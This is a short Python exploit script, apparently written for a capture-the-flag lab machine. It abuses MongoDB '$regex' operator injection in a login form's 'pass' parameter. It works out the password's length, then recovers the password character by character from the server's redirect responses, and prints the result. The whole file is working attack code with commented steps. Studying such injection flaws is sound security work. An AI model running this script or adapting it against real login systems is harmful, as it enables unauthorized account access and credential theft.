#!/usr/bin/python3

import requests
import re
import string

# Update vulnerable URL as needed
url = 'http://10.10.10.146'

# password of user
password = ''
pw_length = 0

# base payload string
gpayload = ''

def main():
    # Call the function to get the password length
    get_passwd_len()
    characters = string.ascii_lowercase + string.ascii_uppercase + string.digits  # Create a string of all possible characters

    for pos in range(pw_length):  # Loop through each position in the password
        for char in characters:  # Loop through all possible characters
            payload = pos_insert(pos, char)  # Create a payload with the character at the current position
            request_sender(payload, char)  # Send the payload to the server and check if it's correct

    # At end of program, return user's password
    print('Your unique password is: ' + password)

def get_passwd_len():
    """
    This function determines the length of the password by sending payloads with increasing
    numbers of dots (.) and checking for a successful response.
    """
    global url
    global gpayload
    global pw_length

    i = 1
    while True:
        # Generate a payload with a number of dots determined by the value of i
        placeholders = i * '.'
        # Craft payload for regex injection
        payload = f'^{placeholders}$'
        # Set 'pass' parameter to regex payload
        data = {'pass[$regex]': payload}
        # Send a POST request to the server and capture the response
        response = requests.post(url, data=data, allow_redirects=False)

        # Check if the response indicates an error
        if 'err' in response.headers['Location']:
            # Increment the number of dots in the payload and continue the loop
            i += 1
            continue
        else:
            # Once the correct payload is found, print the size of the password and payload
            print(f'Found password size: {len(payload) - 2}')
            print(f'Payload: {payload}')
            pw_length = len(payload) - 2
            gpayload = payload[1:-1]
            break

# Inserts a character of a wordlist a-z, then A-Z, then 0-9 until match found at a position
def pos_insert(pos, char):
    """
    This function creates a payload by inserting a character at a specific position in the base payload.
    """
    placeholders = gpayload[:pos] + char + gpayload[pos+1:]
    return f'^{placeholders}$'

# Sends a POST request to vulnerable server location with regex payload
def request_sender(payload, digit):
    """
    This function sends a POST request to the server with the provided payload and checks if the response
    indicates a successful match. If so, it updates the password string with the correct character.
    """
    global password
    data = {
        "pass[$regex]": payload
    }
    response = requests.post(url, data=data, allow_redirects=False)

    # if an error occured, that character is not the password for that character position
    if 'err' in response.headers['Location']:
        pass
    else:
        # if character matches, add it to the users password
        password += str(digit)

main()
